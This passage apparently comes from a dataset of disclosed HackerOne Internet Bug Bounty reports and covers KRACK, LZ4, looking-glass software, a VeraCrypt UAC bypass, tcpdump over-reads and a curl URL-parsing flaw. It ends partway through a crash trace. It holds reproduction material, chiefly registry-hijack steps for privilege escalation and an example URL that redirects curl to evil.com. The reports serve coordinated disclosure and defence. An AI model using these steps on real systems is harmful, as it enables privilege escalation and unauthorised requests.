Similarly, attacks against the group key handshake can be prevented by not retransmitting message 1 of the group key handshake. Alternatively, the access point can retransmit these two handshake messages using the previously used EAPOL-Key replay counter.
Additional Contributions

We helped with writing several patches for hostap, which is used in Linux, Android, and several professional APs.
We wrote most parts of the patch to OpenBSD.
We created vulnerability test tools to detect if devices are vulnerable. The Wi-Fi Alliance is using these to test if new products are affected or not. These test tools will be released publically once they are stable enough.
reed   updated CVE references to CVE-2017-13077, CVE-2017-13078, CVE-2017-13079, CVE-2017-13080, CVE-2017-13081, CVE-2017-13082, CVE-2017-13084, CVE-2017-13086, CVE-2017-13087, CVE-2017-13088. Nov 3rd (5 years ago)reed   updated the severity to medium (6.8). Nov 3rd (5 years ago)Internet Bug Bounty  rewarded vanhoefm with a $25,000 bounty. Nov 3rd (5 years ago)reed   closed the report and changed the status to Resolved. Nov 3rd (5 years ago)reed   requested to disclose this report. Nov 3rd (5 years ago)reed   disclosed this report. Nov 3rd (5 years ago)",https://hackerone.com/reports/286740,No value,No value,No value,2017,11,2,22,8
Internet Bug Bounty,1-10,1.0,No value,"$1,000.00",No value,0.0,None,libcurl duphandle read out of bounds,"sparaschoudis  submitted a report to Internet Bug Bounty.Sep 16th (7 years ago)http://curl.haxx.se/docs/adv_20141105.html  closed the report and changed the status to Resolved. Updated Dec 7th (7 years ago)Internet Bug Bounty  rewarded sparaschoudis with a $1,000 bounty. Dec 7th (7 years ago)",https://hackerone.com/reports/104014,No value,No value,No value,2015,9,16,0,0
Internet Bug Bounty,1-10,1.0,No value,"$3,000.00",No value,0.0,None,libcurl: URL request injection,"isciurus  submitted a report to Internet Bug Bounty.Dec 25th (8 years ago)Internet Bug Bounty  rewarded isciurus with a $3,000 bounty. Jun 30th (7 years ago)  closed the report and changed the status to Resolved. Updated Sep 15th (6 years ago)",https://hackerone.com/reports/73242,No value,No value,No value,2014,12,25,0,0
Internet Bug Bounty,1-10,1.0,No value,"$6,000.00",No value,0.0,Memory Corruption - Generic,LZ4 Core,"donb  submitted a report to Internet Bug Bounty.Jun 26th (8 years ago)#############################################################################
#
# Lab Mouse Security Report
# LMS-2014-06-16-6
#
Report ID: LMS-2014-06-16-6
CVE ID: CVE-2014-4611
Researcher Name: Don A. Bailey
Researcher Organization: Lab Mouse Security
Researcher Email: donb at securitymouse.com
Researcher Website: www.securitymouse.com
Vulnerability Status: Reported / No response
Vulnerability Embargo: Broken
Vulnerability Class: Integer Overflow
Vulnerability Effect: Memory Corruption
Vulnerability Impact: DoS, OOW, RCE
Vulnerability DoS Practicality: Practical
Vulnerability OOW Practicality: Practical
Vulnerability RCE Practicality: Untested
Vulnerability Criticality: High
Vulnerability Scope:
All versions of the LZ4 software:
https://code.google.com/p/lz4
Functions Affected:
lz4.c:LZ4_decompress_generic
Criticality Reasoning
Due to the design of the algorithm, an attacker can specify any desired
offset to a write pointer. The attacker can instrument the write in such
a way as to only write four bytes at a specified offset. Subsequent code
will allow the attacker to escape from the decompression algorithm without
further memory corruption. This may allow the attacker to overwrite
critical structures in memory that affect flow of execution. White DoS
and OOW are obvious side effects of this flaw, RCE with respect to this
flaw is untested. 
Vulnerability Description
An integer overflow can occur when processing any variant of a ""literal run""
in the affected function. 
Vulnerability Resolution
Pending.arice HackerOne staff  closed the report and changed the status to Resolved. Jul 25th (8 years ago)Internet Bug Bounty  rewarded donb with a $6,000 bounty. Jul 25th (8 years ago)Thanks for all the crazy amount of legwork on this finding @donb!arice HackerOne staff  agreed to disclose this report. Jul 25th (8 years ago)  This report has been disclosed. Jul 25th (8 years ago)",https://hackerone.com/reports/17688,No value,No value,No value,2014,6,26,20,11
Internet Bug Bounty,1-10,1.0,No value,$500.00,High,7.95,Code Injection,Mercurial can be tricked into granting authorized users access to the Python debugger,"claudijd  submitted a report to Internet Bug Bounty.Apr 18th (6 years ago)I reported this bug privately to Mercurial and they produced an out of band release to fix the bug here:
https://www.mercurial-scm.org/wiki/WhatsNew#Mercurial_4.1.3_.282017-4-18.29
I produced a very detailed proof of concept with a Metasploit exploit module, which can be seen publicly here:
https://github.com/rapid7/metasploit-framework/pull/8263
The TLDR is that many services which host Mercurial servers often write their own hg-ssh wrapper or heavily customize the hg-ssh wrapper.  If the customized wrapped does not explicitly validate user input to the repo attribute, an attacker can supply a string of ""--debugger"", which causes the internal hg binary to drop to a Pdb shell, which allows arbitrary Python code execution.
I'm submitting to this program because I believe source code management software like git and mercurial is considered critical infrastructure for the Internet.",https://hackerone.com/reports/222020,No value,No value,No value,2017,4,18,21,8
Internet Bug Bounty,1-10,1.0,No value,"$5,000.00",No value,0.0,Cross-site Scripting (XSS) - Generic,Multiple issues in looking-glass software (aka from web to BGP injections),"kaeso  submitted a report to Internet Bug Bounty.Jun 13th (8 years ago)During the month of May 2014 we performed an offensive security analysis, trying to find how hard would it be for a low-to-medium skilled attacker to disrupt the core of the Internet (ie. achieve the largest possible impact at the lowest common layer, with minimal resource). This is a confidential report on our results, showing vulnerabilities and incidents which have been properly reported in the meanwhile (authors contacted, CVE assigned, patches written and incidents handled).
Motivations
The target of our analysis are looking-glasses, web applications hosted by Autonomous Systems to offer restrict public access in order to debug network connectivity issues. We identified them as a possible weak links because:

they are web scripts, directly connected to backbone (BGP) routers via telnet/ssh
many of them have been written in 90's or 00's, without security in mind
many of them have not seen any update in many years
a bunch of open-source software are deployed by many ASes
 A succesfull attack on a looking-glass means gaining access to routers console, by just attacking decade-old PHP/Perl scripts.
An attacker could steal credentials or find web-flaws to login and run arbitrary commands on the routers. Even with proper ACL in place, it is easy to escalate privileges by abusing one of many existing techniques, eg. on Cisco [0] and on Juniper [1] routers.


Once there, an attacker can cause great havoc on the network. Low-hanging targets include leaking sensitive informations (eg. private routing plans) and fingerprinting the internal network. Medium-level attacks could encompass redirecting some of internal routing (eg. setting up mirroring interfaces) or performing DoS (eg. by changin OSPF configuration).
High-level attacks would instead be targeted to the Internet: multiple rogue routers announcing malicious BGP routes will effectively disrupt worldwide connectivity.
 The last point is basically our motivation to submitting for this bug bounty, as the vulnerabilities and incidents below could have been abused to disrupt the Internet at BGP level from multiple injection points.
Results
All the flaws we found can be categorized as follow:

unsafe default config resulting in exposed IP, credentials, and SSH private keys => direct login to routers
weak commands sanitization => arbitrary commands injection to routers
remote memory corruption => RCE on looking-glass servers, exploitable to read routers credentials
reflected XSS => stealing cookies for other network administration panels under the same-origin

In particular, we got 6 CVEs assigned and confirmed:

XSS in Cougar-LG - http://www.s3.eurecom.fr/cve/CVE-2014-3926.txt
Routers command injection in mrlg4php - http://www.s3.eurecom.fr/cve/CVE-2014-3927.txt
Exposed credentials in Cougar-LG - http://www.s3.eurecom.fr/cve/CVE-2014-3928.txt
Exposed SSH keys in Cougar-LG  - http://www.s3.eurecom.fr/cve/CVE-2014-3929.txt
Exposed credentials in Cistron-LG - http://www.s3.eurecom.fr/cve/CVE-2014-3930.txt
Remote memory corruption in SUID binary - http://www.s3.eurecom.fr/cve/CVE-2014-3931.txt

Each report contains full details and timeline on the issue.
Starting from the above CVEs, we performed a brief survey of impacted AS and we observed the following number of incidents:

18 exposed configuration files (containing IPs, usernames, telnet/ssh passwords)
12 remote command injection (via mrlg4php)
4 misconfigured CGI (exposed IPs, usernames, telnet/ssh passwords)
3 exposed SSH private keys

We privately contacted all the ISP (Cc:ing their national FSIRT) to properly secure the exposed configuration files, and to update mrlg4php to fixed version.
Disclosure
In order to avoid major screw-ups, we proceed as following:

asked CERT-FR (our national one) and CERT/CC to coordinate disclosure for us, they suggested instead to handle the issue ourself
contacted MITRE to get confirmation of the issues, got 6 CVEs assigned
contacted authors to report the issues. Worked with the available ones for a patched version. Filled bugs for unreachable ones, as suggested by CERT/CC.
contacted all AS and national FSIRT to report the incidents we spot in the wild. Worked with them for follow-ups.

All the process took ~1 month, and was handled in embargo mode and in private as far as possible. We are now reaching the proposed deadline for full public disclosure (16/06) with no pending blockers by software authors and AS.
Research reports
Once the embargo is over we would like to produce more detailed reports on what we found during the study, as such we are submitting an academic paper to WOOT'14 and a talk at DEFCON'14. Both are current under embargo and pending review, but we can attach them, if requested, under an informal non-disclosure agreement.
[0] Cisco bulletin: cisco-sr-20130318-type4
[1] Juniper bulletin: JSA10420arice HackerOne staff  changed the status to Triaged. Jul 19th (8 years ago)This is great. Thanks for the solid write-up. I've nominated this to the panel for a bounty, and we'll get back to you shortly with the results.arice HackerOne staff  closed the report and changed the status to Resolved. Jul 30th (8 years ago)Internet Bug Bounty  rewarded kaeso with a $5,000 bounty. Jul 30th (8 years ago)arice HackerOne staff  posted a comment. Jul 30th (8 years ago)@kaeso - have you publicly disclosed these findings yet? If not, we'll keep it private here as well for the time being. Just select the public disclosure option if you're ready to share more broadly. Thanks again!kaeso   agreed to disclose this report. Aug 18th (8 years ago)All bugs in active projects have been handled by upstream authors, and all known incidents have been reported to involved ASes. A final heads-up mail was sent to NANOG before going public. More detailed reports are now available as a slide-deck for DEFCON 22 and a paper at WOOT '14, both online.   This report has been disclosed. Sep 17th (8 years ago)",https://hackerone.com/reports/16330,No value,No value,No value,2014,6,13,14,30
Internet Bug Bounty,1-10,1.0,No value,"$1,250.00",Medium,5.45,Privilege Escalation,Local Privilege Escalation during execution of VeraCryptExpander.exe (UAC bypass),"penrose  submitted a report to Internet Bug Bounty.Apr 6th (4 years ago)Summary:
Your VeraCryptExpander.exe is vulnerable to a Local Privilege Escalation (UAC BYPASS) during execution. The issue is located here:
https://github.com/veracrypt/VeraCrypt/blob/a108db7c85248a3b61d0c89c086922332249f518/src/ExpandVolume/VeraCryptExpander.manifest
https://github.com/veracrypt/VeraCrypt/blob/a108db7c85248a3b61d0c89c086922332249f518/src/ExpandVolume/WinMain.cpp
The issue is detected on the fact that you launch a web page  through an elevated process but trust the link to be opened by an app specified by registry keys belonging to HKCU Hive (current user domain) and not an elevated HIVE set like HKEY_LOCAL_MACHINE. It is possible for an attacker that has limited admin privileges (not full admin with UAC) to hijack the execution of you code by tampering specific registry keys linked to browsers and elevate his privileges ultimately tampering your installation folder by writing malicious code in it or replacing binaries with his own.
A file less malware that has hijacked the reghive altering or creating specific keys can hijack the execution of you binary and bypass UAC achieving full admin right.
Examples of malware using UAC bypass: https://attack.mitre.org/techniques/T1088/
The attack was successfully tested in both WIN 7 and WIN 10
Steps To Reproduce:
Windows OS 7 (tested) for this example
Default browser Chrome (works with any default browser option just change the right reg)
User role ADMINISTRATOR - name of my user for the example is: TEMP
Step0. Create malicious script to elevate: malstaller.bat on desktop (attached)
Step1. Tamper Registry Keys - run add.bat attached after altering the current username
This action simulates an attacker (with low privilege admin) tampering the content of the following registry keys (no need for full admin rights). These keys are tampered to cover all cases of popular default browsers:
[HKEY_CURRENT_USER\Software\Classes\ChromeHTML\shell\open\command]
@=""C:\Users\Temp\Desktop\malstaller.bat \""%1\""""
[HKEY_CURRENT_USER\Software\Classes\ChromeURL\shell\open\command]
@=""C:\Users\Temp\Desktop\malstaller.bat \""%1\""""
[HKEY_CURRENT_USER\Software\Classes\FirefoxHTML\shell\open\command]
@=""C:\Users\Temp\Desktop\malstaller.bat \""%1\""""
[HKEY_CURRENT_USER\Software\Classes\FirefoxURL\shell\open\command]
@=""C:\Users\Temp\Desktop\malstaller.bat \""%1\""""
[HKEY_CURRENT_USER\Software\Classes\IE.HTTP\shell\open\command]
@=""C:\Users\Temp\Desktop\malstaller.bat \""%1\""""
[HKEY_CURRENT_USER\Software\Classes\IE.HTTPS\shell\open\command]
@=""C:\Users\Temp\Desktop\malstaller.bat \""%1\""""
[HKEY_CURRENT_USER\Software\Classes\HTTP\shell\open\command]
@=""C:\Users\Temp\Desktop\malstaller.bat \""%1\""""
[HKEY_CURRENT_USER\Software\Classes\HTTPS\shell\open\command]
@=""C:\Users\Temp\Desktop\malstaller.bat \""%1\""""
The path is altered to point to the malicious script that attacker wants to be elevated (UAC bypass attack/privilege escalation). This script can do anything like deleting/creating files under C:. Scheduling tasks etc.
Step2. To achieve/activate UAC bypass
Run VeraCryptExpander.exe and click on the button : ""Homepage"" on the higher top part of the window.
The execution in now hijacked (see video) and UAC bypass is achieved.
A one liner used in the video will place fake VeraCrypt2.exe (with putty.exe as PoC) under your installation folder and execute it with full admin priviledges.
Useful files of your installation can be tampered alternatively and used as backdoor.
Watch the video attached were a simple .bat script gains elevated admin privileges during your software execution and writes in admin space.
WINDOWS 10
User Role: Administrator
In order to successfully replicate the attack on Windows 10 the following steps must be followed (a little bit different from WIN 7) . As windows have changed some security setting you cannot alter the default browser for the attack to happen seamlessly. But win 10 users are still vulnerable. The difference is that after tampering reg keys to trap various browsers (not the current default) on the system in the affected system the victim must change the default browser to one that has been trapped for the exploit to happen.
In the example below on WIN 10 and with Default Browser assuming EDGE, we will trap IE. If after we alter reg keys executing the add.bat, the user chooses IE or any other browser in place as his default browser the exploit works as before.
Be Admin user logged in!
Step 1: Tamper or create registry keys for IE (or run add.bat) no UAC is needed to do so (your default browser is EDGE):
[HKEY_CURRENT_USER\Software\IE.HTTP\shell\open\command][HKEY_CURRENT_USER\Software\IE.HTTPS\shell\open\command]
With value:
""C:\Users{PLACE PROPER USER ACCOUNT NAME HERE}\Desktop\malstaller.bat"" ""%1""
Step 2: After step 1 is done and only then admin user chooses to set IE as default browser (your default browser is IE but in reality user has set our malicious script as default browser!!!).
Step3: Execute your vulnerable  software that triggers the execution of the malicious code with elevated privileges as before. click button ""Homepage"" 
Note:
If the tampered keys are already set for ex. IE (booby-trap set) and for some reason the admin users chooses to change default browser from ex. Edge to IE (booby-trapped) then the attack works smoothly.
Both add.bat and malstaller.bat need changes in the username and relative paths to work for you.
Fix:Remove any link/button to external web resources on elevated processes.
In CPP while inside an elevated process (UAC accepted), use:
void safeCall()
{
system(""explorer http://www.test.com"");
}
Instead of:
void unsafeCall()
{
ShellExecute(0, 0, L""http://www.test.com"", 0, 0, SW_SHOW);
}
The safeCall() will trigger a new process to open the URL with less privileges, keeping you safe from the attack. Stupid workaround but it works if you need to keep the link.
Impact
It is possible for an attacker that has limited admin privileges (not full admin with UAC) to hijack the execution of you code by tampering specific registry keys linked to browsers and elevate his privileges ultimately tampering your installation folder by writing malicious code in it or replacing binaries with his own. The installation of your software can be fully compromised.3 attachments:F463638: Trigger.JPGF463641: malstaller.zipF463642: Poc.mp4",https://hackerone.com/reports/530292,No value,No value,No value,2019,4,6,18,48
Internet Bug Bounty,1-10,1.0,No value,$500.00,High,7.95,Buffer Over-read,The VTP parser in tcpdump before 4.9.2 has a buffer over-read in print-vtp.c:vtp_print(),"bags  submitted a report to Internet Bug Bounty.Feb 23rd (3 years ago)Hello,
The vulnerable code portion is linked below. The linked function is responsible for printing VTP packet payload information to the terminal (e.g., stdout)
https://github.com/the-tcpdump-group/tcpdump/commit/ae83295915d08a854de27a88efac5dd7353e6d3f#diff-8c6895b252e6da31d60a7866973d5787L262-L268
The issue may be reproduced as follows
Check out vulnerable tcpdump commit (< 4.9.2) as follows
Code 230 BytesWrap lines Copy Download1$ git clone -b e0d8ee571438c755ff988f70886f8c4f5e9a8434 https://github.com/the-tcpdump-group/tcpdump
2Build it with afl and AddressSanitizer as follows (please install libpcap before this step)
3$ CC=afl-gcc
4$ AFL_USE_ASAN=1 make -j
Run tcpdump against linked payload (link: https://github.com/the-tcpdump-group/tcpdump/blob/ae83295915d08a854de27a88efac5dd7353e6d3f/tests/vtp_asan-3.pcap?raw=true)
Code 2.73 KiBWrap lines Copy Download1$ tcpdump -nvr <payload>
2reading from file /tmp/vtp_asan-3.pcap, link-type MFR (FRF.16 Frame Relay)
3=================================================================
4==3747==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x61200000015c at pc 0x562e64fcc5d2 bp 0x7ffdd3033300 sp 0x7ffdd30332f0
5READ of size 1 at 0x61200000015c thread T0
6    #0 0x562e64fcc5d1 in fn_printzp util-print.c:217
7    #1 0x562e64fb757e in vtp_print print-vtp.c:262
8    #2 0x562e64ea3aae in snap_print print-llc.c:493
9    #3 0x562e64e0cba5 in fr_print print-fr.c:336
10    #4 0x562e64e0dc9e in mfr_print print-fr.c:563
11    #5 0x562e64d57e1e in pretty_print_packet print.c:332
12    #6 0x562e64d30d8d in print_packet tcpdump.c:2590
13    #7 0x562e65003a78 in pcap_offline_read savefile.c:561
14    #8 0x562e64ff29ee in pcap_loop pcap.c:2737
15    #9 0x562e64d2474d in main tcpdump.c:2093
16    #10 0x7f9726cb6b96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)
17    #11 0x562e64d2c769 in _start (/home/bhargava/work/github/tcpdump/tcpdump+0x17b769)
18
190x61200000015c is located 0 bytes to the right of 284-byte region [0x612000000040,0x61200000015c)
20allocated by thread T0 here:
21    #0 0x7f972737ab50 in __interceptor_malloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xdeb50)
22    #1 0x562e6500480a in pcap_check_header sf-pcap.c:404
23
24SUMMARY: AddressSanitizer: heap-buffer-overflow util-print.c:217 in fn_printzp
25Shadow bytes around the buggy address:
26  0x0c247fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
27  0x0c247fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
28  0x0c247fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
29  0x0c247fff8000: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
30  0x0c247fff8010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
31=>0x0c247fff8020: 00 00 00 00 00 00 00 00 00 00 00[04]fa fa fa fa
32  0x0c247fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
33  0x0c247fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
34  0x0c247fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
35  0x0c247fff8060: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
36  0x0c247fff8070: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
37Shadow byte legend (one shadow byte represents 8 application bytes):
38  Addressable:           00
39  Partially addressable: 01 02 03 04 05 06 07 
40  Heap left redzone:       fa
41  Freed heap region:       fd
42  Stack left redzone:      f1
43  Stack mid redzone:       f2
44  Stack right redzone:     f3
45  Stack after return:      f5
46  Stack use after scope:   f8
47  Global redzone:          f9
48  Global init order:       f6
49  Poisoned by user:        f7
50  Container overflow:      fc
51  Array cookie:            ac
52  Intra object redzone:    bb
53  ASan internal:           fe
54  Left alloca redzone:     ca
55  Right alloca redzone:    cb
56==3747==ABORTING
It is acknowledged here(link: https://github.com/the-tcpdump-group/tcpdump/commit/ae83295915d08a854de27a88efac5dd7353e6d3f) that I (Bhargava Shastry) am the original reporter of the issue.
To prove that this hackerone account belongs to me, I have hosted a file with the following message on my github page(link: https://bshastry.github.io/.well-known/hackerone.txt)
hello @turtle_shell @hackerone
If you have any further queries, please let me know.
Impact
I believe that information disclosure is possible.",https://hackerone.com/reports/802846,No value,No value,No value,2020,2,23,15,3
Internet Bug Bounty,1-10,1.0,No value,$500.00,Medium,6.5,Server-Side Request Forgery (SSRF),cURL / libcURL - CVE-2016-8624 invalid URL parsing with '#',"fms  submitted a report to Internet Bug Bounty.Nov 5th (6 years ago)invalid URL parsing with '#'
Project cURL Security Advisory, November 2, 2016 -
[Permalink] https://curl.haxx.se/docs/adv_20161102J.html
VULNERABILITY
curl doesn't parse the authority component of the URL correctly when the host
name part ends with a '#' character, and could instead be tricked into
connecting to a different host. This may have security implications if you for
example use a URL parser that follows the RFC to check for allowed domains
before using curl to request them.
Passing in http://example.com#@evil.com/x.txt would wrongly make curl send a
request to evil.com while your browser would connect to example.com given the
same URL.
The problem exists for most protocol schemes.
We are not aware of any exploit of this flaw.
INFO
The Common Vulnerabilities and Exposures (CVE) project has assigned the name
CVE-2016-8624 to this issue.
AFFECTED VERSIONS
This flaw exists in the following curl versions.

Affected versions: curl 7.1 to and including 7.50.3
Not affected versions: curl >= 7.51.0

libcurl is used by many applications, but not always advertised as such!
THE SOLUTION
In version 7.51.0, the parser function is fixed.
A patch for CVE-2016-8624 is
available.
RECOMMENDATIONS
We suggest you take one of the following actions immediately, in order of
preference:
 A - Upgrade curl and libcurl to version 7.51.0
 B - Apply the patch to your version and rebuild
 C - Strip out the parts of the URLs containing '#' before passing them to curl
TIME LINE
It was first reported to the curl project on October 10 by Fernando Muñoz.
We contacted distros@openwall on October 19.
curl 7.51.0 was released on November 2 2016, coordinated with the publication
of this advisory.
CREDITS
Thanks to Fernando Muñoz!",https://hackerone.com/reports/180434,No value,No value,No value,2016,11,5,21,31
Internet Bug Bounty,1-10,1.0,No value,$500.00,High,7.95,Buffer Over-read,CVE-2017-13019:  The PGM parser in tcpdump before 4.9.2 has a buffer over-read in print-pgm.c:pgm_print(),"bags  submitted a report to Internet Bug Bounty.Feb 23rd (3 years ago)Hello,
The vulnerable code portion is linked below. The linked function is responsible for printing PGM packet payload information to the terminal (e.g., stdout)
https://github.com/the-tcpdump-group/tcpdump/commit/4601c685e7fd19c3724d5e499c69b8d3ec49933e
The issue may be reproduced as follows
Check out vulnerable tcpdump commit (< 4.9.2) as follows
Code 100 BytesWrap lines Copy Download1$ git clone -b 26a6799b9ca80508c05cac7a9a3bef922991520b https://github.com/the-tcpdump-group/tcpdump
Build it with afl and AddressSanitizer as follows (please install libpcap before this step)
Code 37 BytesWrap lines Copy Download1$ CC=afl-gcc
2$ AFL_USE_ASAN=1 make -j
Run tcpdump against linked payload (link: https://github.com/the-tcpdump-group/tcpdump/blob/4601c685e7fd19c3724d5e499c69b8d3ec49933e/tests/pgm_opts_asan_2.pcap?raw=true)
Code 2.86 KiBWrap lines Copy Download1$ tcpdump -nvr <payload>
2reading from file /tmp/pgm_opts_asan_2.pcap, link-type EN10MB (Ethernet)
3=================================================================
4==3947==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60800000007d at pc 0x5560b85896f6 bp 0x7ffe420b1ca0 sp 0x7ffe420b1c90
5READ of size 4 at 0x60800000007d thread T0
6    #0 0x5560b85896f5 in EXTRACT_32BITS extract.h:190
7    #1 0x5560b85896f5 in pgm_print print-pgm.c:697
8    #2 0x5560b849f20c in ip_print_demux print-ip.c:483
9    #3 0x5560b849f20c in ip_print print-ip.c:658
10    #4 0x5560b84506df in ethertype_print print-ether.c:334
11    #5 0x5560b84531d1 in ether_print print-ether.c:237
12    #6 0x5560b84531d1 in ether_if_print print-ether.c:262
13    #7 0x5560b83b76be in pretty_print_packet print.c:332
14    #8 0x5560b839062d in print_packet tcpdump.c:2590
15    #9 0x5560b8663ee8 in pcap_offline_read savefile.c:561
16    #10 0x5560b8652e5e in pcap_loop pcap.c:2737
17    #11 0x5560b8383fed in main tcpdump.c:2093
18    #12 0x7f7aaf546b96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)
19    #13 0x5560b838c009 in _start (/home/bhargava/work/github/tcpdump/tcpdump+0x17c009)
20
210x60800000007f is located 0 bytes to the right of 95-byte region [0x608000000020,0x60800000007f)
22allocated by thread T0 here:
23    #0 0x7f7aafc0ab50 in __interceptor_malloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xdeb50)
24    #1 0x5560b8664c7a in pcap_check_header sf-pcap.c:404
25
26SUMMARY: AddressSanitizer: heap-buffer-overflow extract.h:190 in EXTRACT_32BITS
27Shadow bytes around the buggy address:
28  0x0c107fff7fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
29  0x0c107fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
30  0x0c107fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
31  0x0c107fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
32  0x0c107fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
33=>0x0c107fff8000: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00[07]
34  0x0c107fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
35  0x0c107fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
36  0x0c107fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
37  0x0c107fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
38  0x0c107fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
39Shadow byte legend (one shadow byte represents 8 application bytes):
40  Addressable:           00
41  Partially addressable: 01 02 03 04 05 06 07 
42  Heap left redzone:       fa
43  Freed heap region:       fd
44  Stack left redzone:      f1
45  Stack mid redzone:       f2
46  Stack right redzone:     f3
47  Stack after return:      f5
48  Stack use after scope:   f8
49  Global redzone:          f9
50  Global init order:       f6
51  Poisoned by user:        f7
52  Container overflow:      fc
53  Array cookie:            ac
54  Intra object redzone:    bb
55  ASan internal:           fe
56  Left alloca redzone:     ca
57  Right alloca redzone:    cb
58==3947==ABORTING
It is acknowledged here(link: https://github.com/the-tcpdump-group/tcpdump/commit/4601c685e7fd19c3724d5e499c69b8d3ec49933e) that I (Bhargava Shastry) am the original reporter of the issue.
To prove that this hackerone account belongs to me, I have hosted a file with the following message on my github page(link: https://bshastry.github.io/.well-known/hackerone.txt)
Code 30 BytesWrap lines Copy Download1hello @turtle_shell @hackerone
If you have any further queries, please let me know.
Tracked as CVE-2017-13019: https://nvd.nist.gov/vuln/detail/CVE-2017-13019
Impact
I believe that information disclosure is possible.",https://hackerone.com/reports/802896,No value,No value,No value,2020,2,23,16,49
Internet Bug Bounty,1-10,1.0,No value,$500.00,High,7.95,Buffer Over-read,"CVE-2017-13040 The MPTCP parser in tcpdump before 4.9.2 has a buffer over-read in print-mptcp.c, several functions.","karas  submitted a report to Internet Bug Bounty.Aug 22nd (2 years ago)Description:
Versions of tcpdump before 4.9.2 are vulnerable to a buffer over-read in print-mptcp.c. This vulnerability was disclosed to the tcpdump maintainers and was recently patched in version 4.9.2 and disclosed as (CVE-2017-13040).
Patch: https://github.com/the-tcpdump-group/tcpdump/commit/4c3aee4bb0294c232d56b6d34e9eeb74f630fe8c
This vulnerability can be exploited in two ways. The first is to produce a .pcap file with crafted packet(s) for the protocol(s) concerned and make the target system try to decode the file using tcpdump. The second is to send specially crafted packet(s) to the network segment where the target system is running a tcpdump process that is decoding a live packet capture. In the latter case it depends on the specific network protocol if the crafted packet(s) may be sent from the local segment only or from a remote Internet host.
Impact
If the affected program is running with special privileges, or accepts data from untrusted network hosts (e.g. a webserver) then the bug is a potential security vulnerability. If the heap buffer is filled with data supplied from an untrusted user then that user can corrupt the memory in such a way as to inject executable code into the running program and take control of the process. This is one of the oldest and more reliable methods for attackers to gain unauthorized access to a computer.",https://hackerone.com/reports/964582,No value,No value,No value,2020,8,22,6,9
Internet Bug Bounty,1-10,1.0,No value,$500.00,High,7.95,Buffer Over-read,CVE-2017-13041 The ICMPv6 parser in tcpdump before 4.9.2 has a buffer over-read in print-icmp6.c:icmp6_nodeinfo_print().,"karas  submitted a report to Internet Bug Bounty.Aug 22nd (2 years ago)Description:
Versions of tcpdump before 4.9.2 are vulnerable to a buffer over-read in print-icmp6.c. This vulnerability was disclosed to the tcpdump maintainers and was recently patched in version 4.9.2 and disclosed as (CVE-2017-13041).
Patch: https://github.com/the-tcpdump-group/tcpdump/commit/f4b9e24c7384d882a7f434cc7413925bf871d63e
This vulnerability can be exploited in two ways. The first is to produce a .pcap file with crafted packet(s) for the protocol(s) concerned and make the target system try to decode the file using tcpdump. The second is to send specially crafted packet(s) to the network segment where the target system is running a tcpdump process that is decoding a live packet capture. In the latter case it depends on the specific network protocol if the crafted packet(s) may be sent from the local segment only or from a remote Internet host.
Impact
If the affected program is running with special privileges, or accepts data from untrusted network hosts (e.g. a webserver) then the bug is a potential security vulnerability. If the heap buffer is filled with data supplied from an untrusted user then that user can corrupt the memory in such a way as to inject executable code into the running program and take control of the process. This is one of the oldest and more reliable methods for attackers to gain unauthorized access to a computer.",https://hackerone.com/reports/964583,No value,No value,No value,2020,8,22,6,12
Internet Bug Bounty,1-10,1.0,No value,$500.00,High,7.95,Buffer Over-read,CVE-2017-13050: The RPKI-Router parser in tcpdump before 4.9.2 has a buffer over-read in print-rpki-rtr.c:rpki_rtr_pdu_print(),"bags  submitted a report to Internet Bug Bounty.Feb 23rd (3 years ago)Hello,
The vulnerable code portion is linked below. The linked function is responsible for printing RPKI-Router packet payload information to the terminal (e.g., stdout)
https://github.com/the-tcpdump-group/tcpdump/commit/83c64fce3a5226b080e535f5131a8a318f30e79b
The issue may be reproduced as follows
Check out vulnerable tcpdump commit (< 4.9.2) as follows
Code 100 BytesWrap lines Copy Download1$ git clone -b 289c672020280529fd382f3502efab7100d638ec https://github.com/the-tcpdump-group/tcpdump
Build it with afl and AddressSanitizer as follows (please install libpcap before this step)
Code 37 BytesWrap lines Copy Download1$ CC=afl-gcc
2$ AFL_USE_ASAN=1 make -j
Run tcpdump against linked payload (link: https://github.com/the-tcpdump-group/tcpdump/blob/83c64fce3a5226b080e535f5131a8a318f30e79b/tests/rpki-rtr-oob.pcap?raw=true)
Code 2.98 KiBWrap lines Copy Download1$ tcpdump -nvr <payload>
2reading from file /tmp/rpki-rtr-oob.pcap, link-type EN10MB (Ethernet)
3=================================================================
4==3569==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6070000000e2 at pc 0x562a16588231 bp 0x7ffc51f88550 sp 0x7ffc51f88540
5READ of size 4 at 0x6070000000e2 thread T0
6    #0 0x562a16588230 in EXTRACT_32BITS extract.h:190
7    #1 0x562a16588230 in rpki_rtr_pdu_print print-rpki-rtr.c:243
8    #2 0x562a16588230 in rpki_rtr_print print-rpki-rtr.c:355
